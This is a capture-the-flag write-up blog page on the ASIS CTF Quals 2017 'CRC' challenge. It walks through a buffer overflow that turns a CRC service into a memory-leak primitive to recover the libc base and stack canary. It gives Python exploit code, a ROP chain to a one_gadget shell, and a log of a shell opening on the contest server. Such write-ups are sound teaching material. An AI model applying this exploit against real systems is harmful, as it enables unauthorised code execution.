@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>ASIS CTF Quals 2017 - CRC | kileak</title>
+
+
+
+
+
+<meta name="description" content="ASIS CTF Quals 2017 - CRC">
+
+
+<meta name="keywords" content="ASIS">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/ASISQUALS-CRC/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">ASIS CTF Quals 2017 - CRC</h1>
+      <p class="post-meta">Apr 10, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>We have setup a fresh CRC generator service, but it’s not hardened, so find the flag.
+<!--break-->
+   This service running on latest Ubuntu Xenial OS.</p>
+
+  <p>nc 69.90.132.40 4002</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/crc/crcme">crcme</a> <a href="https://kileak.github.io/assets/crc/crchelper.c">crchelper.c</a> <a href="https://kileak.github.io/assets/crc/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/crc/libc_32.so.6">libc_32.so.6</a></p>
+
+</blockquote>
+
+<p>The CRC service asks us for a size and some data to process. It then generates a checksum for the specified string and prints it back.</p>
+
+<p>Quick check with checksec reveals:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL</code></pre></figure>
+
+<p>Well, at least no PIE, but it’s ovious, we’ll have to leak some data to get around those restrictions.</p>
+
+<p>The function <em>get_userinput_number</em> contained an obvious buffer overflow, but it’s guarded with a canary, so it won’t be that easy to exploit.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">get_userinput_number</span><span class="p">()</span> 
+<span class="p">{</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>OK, we’ll need some way to leak memory addresses in order to find LIBC and to read the canary. After that, it should be an easy task to use <em>get_userinput_number</em> to execute a rop chain.</p>
+
+<p>Took an educated guess there, that the crc functionality should be abused to leak some data.</p>
+
+<p>Another “buffer overflow” happened to arise when reading the data, that should be CRC’ed.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">s</span><span class="p">;</span>			<span class="c1">// [sp+4h] [bp-84h]@1</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">ptrInput</span><span class="p">;</span> 	<span class="c1">// [sp+68h] [bp-20h]@1</span>
+<span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>
+<span class="n">ptrInput</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">;</span>
+<span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>
+<span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+<span class="n">calcCrc</span><span class="p">(</span><span class="n">ptrInput</span><span class="p">,</span> <span class="n">crcSize</span><span class="p">);</span></code></pre></figure>
+
+<p>So, if everything goes right, ptrInput is pointing to the string, the user entered and gets used as the argument for the CRC function. But since it’s stored directly behind the input string (s) itself and <em>gets</em> is used, we can overwrite the pointer with some arbitrary address. With this, we’re able to create a checksum for the data, that is stored at any address. But still, we will only get the CRC value for the data at this address. Thus, we need a method to reverse it in order to get the original value.</p>
+
+<p>To make this easier, we can pass a size of 1, so the CRC function will only calculate the checksum for one byte. We’ll still need a way to reverse this, but since we’re now only considering one byte, there will be only 256 possible checksum values. This should be easy to brute force.</p>
+
+<p>Ripped the CRC initialization method and the calculation method directly from the binary and created a short c script with it (see <em>crchelper.c</em>), which will generate a lookup table with the checksums for every possible byte.</p>
+
+<p>Now we just have to call the CRC function for every byte in the address, we want to read and extract the returned checksum. The index of the checksum in our lookup table then represents the byte stored at the specified address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">CRCLOOKUP</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xd202ef8d</span><span class="p">,</span><span class="mh">0xa505df1b</span><span class="p">,</span><span class="mh">0x3c0c8ea1</span><span class="p">,</span><span class="mh">0x4b0bbe37</span><span class="p">,</span><span class="mh">0xd56f2b94</span><span class="p">,</span><span class="mh">0xa2681b02</span><span class="p">,</span><span class="mh">0x3b614ab8</span><span class="p">,</span><span class="mh">0x4c667a2e</span><span class="p">,</span><span class="mh">0xdcd967bf</span><span class="p">,</span><span class="mh">0xabde5729</span><span class="p">,</span><span class="mh">0x32d70693</span><span class="p">,</span><span class="mh">0x45d03605</span><span class="p">,</span><span class="mh">0xdbb4a3a6</span><span class="p">,</span><span class="mh">0xacb39330</span><span class="p">,</span><span class="mh">0x35bac28a</span><span class="p">,</span><span class="mh">0x42bdf21c</span><span class="p">,</span><span class="mh">0xcfb5ffe9</span><span class="p">,</span><span class="mh">0xb8b2cf7f</span><span class="p">,</span><span class="mh">0x21bb9ec5</span><span class="p">,</span><span class="mh">0x56bcae53</span><span class="p">,</span><span class="mh">0xc8d83bf0</span><span class="p">,</span><span class="mh">0xbfdf0b66</span><span class="p">,</span><span class="mh">0x26d65adc</span><span class="p">,</span><span class="mh">0x51d16a4a</span><span class="p">,</span><span class="mh">0xc16e77db</span><span class="p">,</span><span class="mh">0xb669474d</span><span class="p">,</span><span class="mh">0x2f6016f7</span><span class="p">,</span><span class="mh">0x58672661</span><span class="p">,</span><span class="mh">0xc603b3c2</span><span class="p">,</span><span class="mh">0xb1048354</span><span class="p">,</span><span class="mh">0x280dd2ee</span><span class="p">,</span><span class="mh">0x5f0ae278</span><span class="p">,</span><span class="mh">0xe96ccf45</span><span class="p">,</span><span class="mh">0x9e6bffd3</span><span class="p">,</span><span class="mh">0x762ae69</span><span class="p">,</span><span class="mh">0x70659eff</span><span class="p">,</span><span class="mh">0xee010b5c</span><span class="p">,</span><span class="mh">0x99063bca</span><span class="p">,</span><span class="mh">0xf6a70</span><span class="p">,</span><span class="mh">0x77085ae6</span><span class="p">,</span><span class="mh">0xe7b74777</span><span class="p">,</span><span class="mh">0x90b077e1</span><span class="p">,</span><span class="mh">0x9b9265b</span><span class="p">,</span><span class="mh">0x7ebe16cd</span><span class="p">,</span><span class="mh">0xe0da836e</span><span class="p">,</span><span class="mh">0x97ddb3f8</span><span class="p">,</span><span class="mh">0xed4e242</span><span class="p">,</span><span class="mh">0x79d3d2d4</span><span class="p">,</span><span class="mh">0xf4dbdf21</span><span class="p">,</span><span class="mh">0x83dcefb7</span><span class="p">,</span><span class="mh">0x1ad5be0d</span><span class="p">,</span><span class="mh">0x6dd28e9b</span><span class="p">,</span><span class="mh">0xf3b61b38</span><span class="p">,</span><span class="mh">0x84b12bae</span><span class="p">,</span><span class="mh">0x1db87a14</span><span class="p">,</span><span class="mh">0x6abf4a82</span><span class="p">,</span><span class="mh">0xfa005713</span><span class="p">,</span><span class="mh">0x8d076785</span><span class="p">,</span><span class="mh">0x140e363f</span><span class="p">,</span><span class="mh">0x630906a9</span><span class="p">,</span><span class="mh">0xfd6d930a</span><span class="p">,</span><span class="mh">0x8a6aa39c</span><span class="p">,</span><span class="mh">0x1363f226</span><span class="p">,</span><span class="mh">0x6464c2b0</span><span class="p">,</span><span class="mh">0xa4deae1d</span><span class="p">,</span><span class="mh">0xd3d99e8b</span><span class="p">,</span><span class="mh">0x4ad0cf31</span><span class="p">,</span><span class="mh">0x3dd7ffa7</span><span class="p">,</span><span class="mh">0xa3b36a04</span><span class="p">,</span><span class="mh">0xd4b45a92</span><span class="p">,</span><span class="mh">0x4dbd0b28</span><span class="p">,</span><span class="mh">0x3aba3bbe</span><span class="p">,</span><span class="mh">0xaa05262f</span><span class="p">,</span><span class="mh">0xdd0216b9</span><span class="p">,</span><span class="mh">0x440b4703</span><span class="p">,</span><span class="mh">0x330c7795</span><span class="p">,</span><span class="mh">0xad68e236</span><span class="p">,</span><span class="mh">0xda6fd2a0</span><span class="p">,</span><span class="mh">0x4366831a</span><span class="p">,</span><span class="mh">0x3461b38c</span><span class="p">,</span><span class="mh">0xb969be79</span><span class="p">,</span><span class="mh">0xce6e8eef</span><span class="p">,</span><span class="mh">0x5767df55</span><span class="p">,</span><span class="mh">0x2060efc3</span><span class="p">,</span><span class="mh">0xbe047a60</span><span class="p">,</span><span class="mh">0xc9034af6</span><span class="p">,</span><span class="mh">0x500a1b4c</span><span class="p">,</span><span class="mh">0x270d2bda</span><span class="p">,</span><span class="mh">0xb7b2364b</span><span class="p">,</span><span class="mh">0xc0b506dd</span><span class="p">,</span><span class="mh">0x59bc5767</span><span class="p">,</span><span class="mh">0x2ebb67f1</span><span class="p">,</span><span class="mh">0xb0dff252</span><span class="p">,</span><span class="mh">0xc7d8c2c4</span><span class="p">,</span><span class="mh">0x5ed1937e</span><span class="p">,</span><span class="mh">0x29d6a3e8</span><span class="p">,</span><span class="mh">0x9fb08ed5</span><span class="p">,</span><span class="mh">0xe8b7be43</span><span class="p">,</span><span class="mh">0x71beeff9</span><span class="p">,</span><span class="mh">0x6b9df6f</span><span class="p">,</span><span class="mh">0x98dd4acc</span><span class="p">,</span><span class="mh">0xefda7a5a</span><span class="p">,</span><span class="mh">0x76d32be0</span><span class="p">,</span><span class="mh">0x1d41b76</span><span class="p">,</span><span class="mh">0x916b06e7</span><span class="p">,</span><span class="mh">0xe66c3671</span><span class="p">,</span><span class="mh">0x7f6567cb</span><span class="p">,</span><span class="mh">0x862575d</span><span class="p">,</span><span class="mh">0x9606c2fe</span><span class="p">,</span><span class="mh">0xe101f268</span><span class="p">,</span><span class="mh">0x7808a3d2</span><span class="p">,</span><span class="mh">0xf0f9344</span><span class="p">,</span><span class="mh">0x82079eb1</span><span class="p">,</span><span class="mh">0xf500ae27</span><span class="p">,</span><span class="mh">0x6c09ff9d</span><span class="p">,</span><span class="mh">0x1b0ecf0b</span><span class="p">,</span><span class="mh">0x856a5aa8</span><span class="p">,</span><span class="mh">0xf26d6a3e</span><span class="p">,</span><span class="mh">0x6b643b84</span><span class="p">,</span><span class="mh">0x1c630b12</span><span class="p">,</span><span class="mh">0x8cdc1683</span><span class="p">,</span><span class="mh">0xfbdb2615</span><span class="p">,</span><span class="mh">0x62d277af</span><span class="p">,</span><span class="mh">0x15d54739</span><span class="p">,</span><span class="mh">0x8bb1d29a</span><span class="p">,</span><span class="mh">0xfcb6e20c</span><span class="p">,</span><span class="mh">0x65bfb3b6</span><span class="p">,</span><span class="mh">0x12b88320</span><span class="p">,</span><span class="mh">0x3fba6cad</span><span class="p">,</span><span class="mh">0x48bd5c3b</span><span class="p">,</span><span class="mh">0xd1b40d81</span><span class="p">,</span><span class="mh">0xa6b33d17</span><span class="p">,</span><span class="mh">0x38d7a8b4</span><span class="p">,</span><span class="mh">0x4fd09822</span><span class="p">,</span><span class="mh">0xd6d9c998</span><span class="p">,</span><span class="mh">0xa1def90e</span><span class="p">,</span><span class="mh">0x3161e49f</span><span class="p">,</span><span class="mh">0x4666d409</span><span class="p">,</span><span class="mh">0xdf6f85b3</span><span class="p">,</span><span class="mh">0xa868b525</span><span class="p">,</span><span class="mh">0x360c2086</span><span class="p">,</span><span class="mh">0x410b1010</span><span class="p">,</span><span class="mh">0xd80241aa</span><span class="p">,</span><span class="mh">0xaf05713c</span><span class="p">,</span><span class="mh">0x220d7cc9</span><span class="p">,</span><span class="mh">0x550a4c5f</span><span class="p">,</span><span class="mh">0xcc031de5</span><span class="p">,</span><span class="mh">0xbb042d73</span><span class="p">,</span><span class="mh">0x2560b8d0</span><span class="p">,</span><span class="mh">0x52678846</span><span class="p">,</span><span class="mh">0xcb6ed9fc</span><span class="p">,</span><span class="mh">0xbc69e96a</span><span class="p">,</span><span class="mh">0x2cd6f4fb</span><span class="p">,</span><span class="mh">0x5bd1c46d</span><span class="p">,</span><span class="mh">0xc2d895d7</span><span class="p">,</span><span class="mh">0xb5dfa541</span><span class="p">,</span><span class="mh">0x2bbb30e2</span><span class="p">,</span><span class="mh">0x5cbc0074</span><span class="p">,</span><span class="mh">0xc5b551ce</span><span class="p">,</span><span class="mh">0xb2b26158</span><span class="p">,</span><span class="mh">0x4d44c65</span><span class="p">,</span><span class="mh">0x73d37cf3</span><span class="p">,</span><span class="mh">0xeada2d49</span><span class="p">,</span><span class="mh">0x9ddd1ddf</span><span class="p">,</span><span class="mh">0x3b9887c</span><span class="p">,</span><span class="mh">0x74beb8ea</span><span class="p">,</span><span class="mh">0xedb7e950</span><span class="p">,</span><span class="mh">0x9ab0d9c6</span><span class="p">,</span><span class="mh">0xa0fc457</span><span class="p">,</span><span class="mh">0x7d08f4c1</span><span class="p">,</span><span class="mh">0xe401a57b</span><span class="p">,</span><span class="mh">0x930695ed</span><span class="p">,</span><span class="mh">0xd62004e</span><span class="p">,</span><span class="mh">0x7a6530d8</span><span class="p">,</span><span class="mh">0xe36c6162</span><span class="p">,</span><span class="mh">0x946b51f4</span><span class="p">,</span><span class="mh">0x19635c01</span><span class="p">,</span><span class="mh">0x6e646c97</span><span class="p">,</span><span class="mh">0xf76d3d2d</span><span class="p">,</span><span class="mh">0x806a0dbb</span><span class="p">,</span><span class="mh">0x1e0e9818</span><span class="p">,</span><span class="mh">0x6909a88e</span><span class="p">,</span><span class="mh">0xf000f934</span><span class="p">,</span><span class="mh">0x8707c9a2</span><span class="p">,</span><span class="mh">0x17b8d433</span><span class="p">,</span><span class="mh">0x60bfe4a5</span><span class="p">,</span><span class="mh">0xf9b6b51f</span><span class="p">,</span><span class="mh">0x8eb18589</span><span class="p">,</span><span class="mh">0x10d5102a</span><span class="p">,</span><span class="mh">0x67d220bc</span><span class="p">,</span><span class="mh">0xfedb7106</span><span class="p">,</span><span class="mh">0x89dc4190</span><span class="p">,</span><span class="mh">0x49662d3d</span><span class="p">,</span><span class="mh">0x3e611dab</span><span class="p">,</span><span class="mh">0xa7684c11</span><span class="p">,</span><span class="mh">0xd06f7c87</span><span class="p">,</span><span class="mh">0x4e0be924</span><span class="p">,</span><span class="mh">0x390cd9b2</span><span class="p">,</span><span class="mh">0xa0058808</span><span class="p">,</span><span class="mh">0xd702b89e</span><span class="p">,</span><span class="mh">0x47bda50f</span><span class="p">,</span><span class="mh">0x30ba9599</span><span class="p">,</span><span class="mh">0xa9b3c423</span><span class="p">,</span><span class="mh">0xdeb4f4b5</span><span class="p">,</span><span class="mh">0x40d06116</span><span class="p">,</span><span class="mh">0x37d75180</span><span class="p">,</span><span class="mh">0xaede003a</span><span class="p">,</span><span class="mh">0xd9d930ac</span><span class="p">,</span><span class="mh">0x54d13d59</span><span class="p">,</span><span class="mh">0x23d60dcf</span><span class="p">,</span><span class="mh">0xbadf5c75</span><span class="p">,</span><span class="mh">0xcdd86ce3</span><span class="p">,</span><span class="mh">0x53bcf940</span><span class="p">,</span><span class="mh">0x24bbc9d6</span><span class="p">,</span><span class="mh">0xbdb2986c</span><span class="p">,</span><span class="mh">0xcab5a8fa</span><span class="p">,</span><span class="mh">0x5a0ab56b</span><span class="p">,</span><span class="mh">0x2d0d85fd</span><span class="p">,</span><span class="mh">0xb404d447</span><span class="p">,</span><span class="mh">0xc303e4d1</span><span class="p">,</span><span class="mh">0x5d677172</span><span class="p">,</span><span class="mh">0x2a6041e4</span><span class="p">,</span><span class="mh">0xb369105e</span><span class="p">,</span><span class="mh">0xc46e20c8</span><span class="p">,</span><span class="mh">0x72080df5</span><span class="p">,</span><span class="mh">0x50f3d63</span><span class="p">,</span><span class="mh">0x9c066cd9</span><span class="p">,</span><span class="mh">0xeb015c4f</span><span class="p">,</span><span class="mh">0x7565c9ec</span><span class="p">,</span><span class="mh">0x262f97a</span><span class="p">,</span><span class="mh">0x9b6ba8c0</span><span class="p">,</span><span class="mh">0xec6c9856</span><span class="p">,</span><span class="mh">0x7cd385c7</span><span class="p">,</span><span class="mh">0xbd4b551</span><span class="p">,</span><span class="mh">0x92dde4eb</span><span class="p">,</span><span class="mh">0xe5dad47d</span><span class="p">,</span><span class="mh">0x7bbe41de</span><span class="p">,</span><span class="mh">0xcb97148</span><span class="p">,</span><span class="mh">0x95b020f2</span><span class="p">,</span><span class="mh">0xe2b71064</span><span class="p">,</span><span class="mh">0x6fbf1d91</span><span class="p">,</span><span class="mh">0x18b82d07</span><span class="p">,</span><span class="mh">0x81b17cbd</span><span class="p">,</span><span class="mh">0xf6b64c2b</span><span class="p">,</span><span class="mh">0x68d2d988</span><span class="p">,</span><span class="mh">0x1fd5e91e</span><span class="p">,</span><span class="mh">0x86dcb8a4</span><span class="p">,</span><span class="mh">0xf1db8832</span><span class="p">,</span><span class="mh">0x616495a3</span><span class="p">,</span><span class="mh">0x1663a535</span><span class="p">,</span><span class="mh">0x8f6af48f</span><span class="p">,</span><span class="mh">0xf86dc419</span><span class="p">,</span><span class="mh">0x660951ba</span><span class="p">,</span><span class="mh">0x110e612c</span><span class="p">,</span><span class="mh">0x88073096</span><span class="p">,</span><span class="mh">0xff000000</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">crc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the length of your data:"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"process:"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CRC is: "</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">)</span>	
+
+	<span class="k">return</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">readAddress</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+		<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>
+		<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+
+		<span class="n">crcByte</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">crc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+		<span class="n">orgByte</span> <span class="o">=</span> <span class="n">CRCLOOKUP</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">crcByte</span><span class="p">)</span>
+
+		<span class="n">result</span> <span class="o">+=</span> <span class="n">orgByte</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+		
+	<span class="k">return</span> <span class="n">result</span></code></pre></figure>
+
+<p>Armed with this, we can read some got entry and calculate the libc base address with it. With libc at hand, we’ll have for one access to more rop gadgets, than we’ll ever need and we can also leak <em>__environ</em> with it. Since it will be stored at a fixed offset to the canary, we can then calculate the position of the canary on the stack.</p>
+
+<p>Having the address of the canary, we can just “de-crc” it the same way:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">EXITGOT</span> <span class="o">=</span> <span class="mh">0x08049fec</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">)</span>
+
+	<span class="n">EXIT</span> <span class="o">=</span> <span class="n">readAddress</span><span class="p">(</span><span class="n">EXITGOT</span><span class="p">)</span>	
+	<span class="n">LIBC</span> <span class="o">=</span> <span class="n">EXIT</span> <span class="o">-</span> <span class="mh">0x2e7b0</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">"[+] EXIT       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">EXIT</span><span class="p">))</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">"[+] LIBC       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+
+	<span class="n">__ENV</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x001b1dbc</span>
+
+	<span class="n">ENVPTR</span> <span class="o">=</span> <span class="n">readAddress</span><span class="p">(</span><span class="n">__ENV</span><span class="p">)</span>
+	<span class="n">CANARYPTR</span> <span class="o">=</span> <span class="n">ENVPTR</span> <span class="o">-</span> <span class="mh">0xd0</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">"[+] ENV        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ENVPTR</span><span class="p">))</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">"[+] Canary ptr : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARYPTR</span><span class="p">))</span>
+
+	<span class="n">CANARY</span> <span class="o">=</span> <span class="n">readAddress</span><span class="p">(</span><span class="n">CANARYPTR</span><span class="p">)</span>
+
+	<span class="k">print</span> <span class="p">(</span><span class="s">"[+] Canary     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">python xpl.py 
+[+] Opening connection to localhost on port 6666: Done
+[7087]
+[*] Paused (press any to continue)
+[+] EXIT       : 0xf7e4c7b0
+[+] LIBC       : 0xf7e1e000
+[+] ENV        : 0xffffd32c
+[+] Canary ptr : 0xffffd25c
+[+] Canary     : 0xfe381000</code></pre></figure>
+
+<p>The buffer overflow in “get_userinput_function” should now be an easy victim.</p>
+
+<p>Used one_gadget to find a magic gadget in their libc to make things easier.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ one_gadget libc_32.so.6
+0x3a819	execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the address of `rw-p` area of libc
+  [esp+0x34] == NULL
+
+0x5f065	execl("/bin/sh", eax)
+constraints:
+  esi is the address of `rw-p` area of libc
+  eax == NULL
+
+0x5f066	execl("/bin/sh", [esp])
+constraints:
+  esi is the address of `rw-p` area of libc
+  [esp] == NULL</code></pre></figure>
+
+<p>With this our final ropchain is:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ONEGADGET</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x5f065</span>
+<span class="n">RWP</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x1b0000</span>
+<span class="n">POP_ESI_EDI_EBP</span> <span class="o">=</span> <span class="mh">0x08048850</span>
+<span class="n">XOREAX</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x0002c5fc</span>
+	
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">CANARY</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">12</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP_ESI_EDI_EBP</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">RWP</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">XOREAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ONEGADGET</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">return</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[+] Opening connection to 69.90.132.40 on port 4002: Done
+[+] EXIT       : 0xf75dc7b0
+[+] LIBC       : 0xf75ae000
+[+] ENV        : 0xffd1cd3c
+[+] Canary ptr : 0xffd1cc6c
+[+] Canary     : 0xffa0db00
+[+] ONEGADGET  : 0xf760d065
+[*] Switching to interactive mode
+ $ whoami
+task2
+$ cat /home/task2/flag.txt
+**ASIS{db17755326b5df9dab92e18e43c3ee51}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=ASIS CTF Quals 2017 - CRC&amp;url=https://kileak.github.io/ctf/2017/ASISQUALS-CRC/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/ASISQUALS-CRC/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/ASISQUALS-CRC';
+        var disqus_title = 'ASIS CTF Quals 2017 - CRC';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/ASISQUALS-CRC';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
